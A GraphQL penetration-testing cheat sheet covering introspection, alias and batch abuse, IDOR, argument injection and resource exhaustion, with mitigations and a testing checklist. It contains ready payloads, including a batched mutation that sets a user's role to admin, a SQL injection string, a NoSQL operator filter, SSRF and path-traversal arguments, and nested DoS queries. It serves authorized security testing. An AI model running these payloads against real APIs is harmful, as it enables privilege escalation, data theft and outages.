## 🕸️ GraphQL Cheat Sheet

> **Scope:** Authorized testing only — systems you own or have explicit written permission to assess. Use placeholders (`<TARGET>`, `<TOKEN>`, `<USER>`); never store real flags, API keys, credentials, or production data.

---

### ⚡ 1. Quick Reference

| Goal | Technique |
|------|-----------|
| Map the API | `__schema` / `__type` introspection |
| Bypass field authz | Aliases, fragments, nested fields, batching |
| Bypass rate limits | Batch arrays or 50–100 aliases per operation |
| Find IDOR | `user(id:)`, `node(id:)`, global IDs, `me` vs `user` |
| Inject into backends | Arguments → SQL / NoSQL / command / SSRF / path |
| Abuse GET | `?query=` enables CSRF and cache tricks |

### 🔍 2. Discovery & Introspection

Try `/graphql`, `/api/graphql`, `/graphql/v1`, `/graphiql`, `/playground`, `/gql`.

```http
POST /graphql HTTP/1.1
Host: <TARGET>
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name kind } } } } } } }"}
```

```graphql
query { __type(name: "User") { fields { name type { name kind } } } }
```

```bash
curl -sG 'https://<TARGET>/graphql' --data-urlencode 'query={__schema{types{name}}}' -H 'Authorization: Bearer <TOKEN>'
curl -s -X POST 'https://<TARGET>/graphql' -d 'query={__typename}' -H 'Content-Type: application/x-www-form-urlencoded'
```

If introspection is blocked: switch GET/POST, try versioned paths and IDE assets, probe `__type(name:"<GUESS>")`, and mine field-suggestion error messages.

### 🧩 3. Aliases, Fragments & Batching

```graphql
fragment Core on User { id email }
query { a: user(id:"<USER>") { ...Core } b: me { ...Core } }
query { u1: checkCoupon(code:"<COUPON>") { valid } u2: checkCoupon(code:"<COUPON>") { valid } }
```

```http
POST /graphql HTTP/1.1
Host: <TARGET>
Content-Type: application/json

[{"query":"{ products { name } }"},
 {"query":"mutation { updateUser(id:\"<USER>\", input:{role:\"admin\"}) { id role } }"},
 {"query":"{ me { email } }"}]
```

| Test | Catches |
|------|---------|
| Batched public + private operations | WAF/rate limiter inspecting only the first item |
| Many aliases in one operation | Limits counting queries instead of resolver executions |
| Variables instead of literals | Regex-only input filters |

### 🔓 4. Authorization Bypass & IDOR

```graphql
query { public: products { name } private: adminUsers { email role } }
query { me { id email auditLog { action ip } } }
{ user(id: "<USER>") { id email role address } }
{ node(id: "<BASE64_GLOBAL_ID>") { id ... on User { email } } }
mutation { updateProfile(id: "<USER>", input: { email: "<NEW_EMAIL>" }) { id } }
```

| Test | What it catches |
|------|-----------------|
| Anonymous / low-priv / admin tokens | Missing field- or object-level checks |
| Aliased private fields | Authz bound to the top-level field name |
| GET vs POST vs form vs multipart | Method-specific middleware rules |
| WebSocket subscriptions | Missing auth on upgrade/subscribe |

```bash
echo '<BASE64_GLOBAL_ID>' | base64 -d        # Relay ID often encodes "User:<USER>"
```

Check `id` returned vs `id` requested; test sequential IDs, UUIDs, tenant IDs, and list fields like `users(ids:["<USER>","<OTHER_USER>"])`.

### 💉 5. Injection Through Arguments

```graphql
{ users(search: "' OR 1=1 -- ") { id email } }
{ users(filter: "{\"role\":{\"$ne\":null}}") { id role } }
{ preview(url: "http://<INTERNAL_HOST>/<PATH>") { title } }
mutation { exportReport(path: "<TARGET>/../../<FILE>") { url } }
mutation { updateProfile(id:"<USER>", input:{bio:"<IMG_SRC_ONERROR>"}) { bio } }
```

| Sink | Payload shape | Backend |
|------|---------------|---------|
| `search`, `filter`, `sort` | quotes, `$ne`, `$regex`, operators | SQL / NoSQL |
| `path`, `filename`, `url` | `../`, internal URLs | File / SSRF |
| `cmd`, `template`, `format` | metacharacters, template expressions | Command / SSTI |
| `bio`, `title`, `html` | safe placeholder markup | Stored XSS |

GraphQL is a transport, not a sanitizer — test variables, directives, and multipart file-map entries too.

### ⏱️ 6. Resource Abuse

```graphql
query { a1: user(id:"<USER>"){ friends { friends { id } } }
        a2: user(id:"<USER>"){ friends { friends { id } } } }
query { users { posts { comments { author { posts { id } } } } } }
```

Check depth limits, complexity budgets, payload size, timeouts, and per-IP quotas; keep DoS probes within the agreed window.

### 🛠️ 7. Tooling & Impact

| Tool | Use |
|------|-----|
| **Burp InQL** | Generate queries from introspection |
| **Burp GraphQL Raider** | Send queries/mutations from Repeater |
| **Altair / GraphiQL** | Interactive schema exploration |

Impact: IDOR, privilege escalation via mutations, auth bypass, batched brute force, SQL/NoSQL/command injection, SSRF, over-fetching, and availability loss.

---

### 🛡️ 8. Mitigation

1. Disable introspection in production or restrict it to trusted operators.
2. Authorize per field and per object, independent of aliases and operation names.
3. Reject or cap batch arrays; rate-limit by resolver execution.
4. Limit query depth, complexity, aliases, size, and execution time.
5. Parameterize all resolver inputs; never concatenate into backend queries.
6. Allowlist URL-fetching resolvers; block internal and metadata networks.
7. Require auth for mutations, subscriptions, and WebSocket upgrades; strip verbose errors.

---

### ✅ 9. Testing Checklist

- [ ] Enumerate endpoints/IDEs; try GET, POST, form, multipart, WebSocket.
- [ ] Run `__schema` / `__type`; save a sanitized schema snapshot.
- [ ] Compare anonymous, low-privilege, and elevated tokens on every field.
- [ ] Test alias-based and batched access to private fields/mutations.
- [ ] Test IDOR on `user`, `node`, orders, files, and tenant fields.
- [ ] Test batching/alias floods against login, coupon, and OTP endpoints.
- [ ] Inject into arguments reaching SQL, NoSQL, shell, templates, paths, URLs; check limits/errors.

---

### 📚 10. References

- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [PortSwigger: GraphQL API vulnerabilities](https://portswigger.net/web-security/api-testing/graphql)
- [Burp InQL](https://github.com/doyensec/inql)

**🕸️ Happy authorized testing!**
